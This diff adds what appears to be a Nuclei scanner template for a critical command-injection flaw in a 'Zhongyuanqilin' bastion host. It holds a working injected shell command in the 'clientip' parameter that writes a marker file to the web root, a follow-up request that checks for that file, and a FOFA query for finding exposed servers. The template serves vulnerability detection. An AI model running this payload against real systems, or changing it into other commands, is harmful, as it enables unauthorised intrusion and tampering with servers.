@@ -1,0 +1,29 @@
+id: zhongyuanqilin-file-upload
+
+info:
+  name: Zhongyuanqilin File Upload
+  author: zp857
+  severity: critical
+  tags: zhongyuanqilin,fileupload,zhongyuanqilin-fortress
+  metadata:
+    fofa-query: 'cert.subject="Baolei"'
+
+requests:
+  - raw:
+      - |
+        GET /get_luser_by_sshport.php?clientip=1;echo+%27zp857%27%3E/opt/freesvr/web/htdocs/freesvr/audit/zp857.txt;&clientport=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /zp857.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "zp857"
+
+      - type: status
+        status:
+          - 200
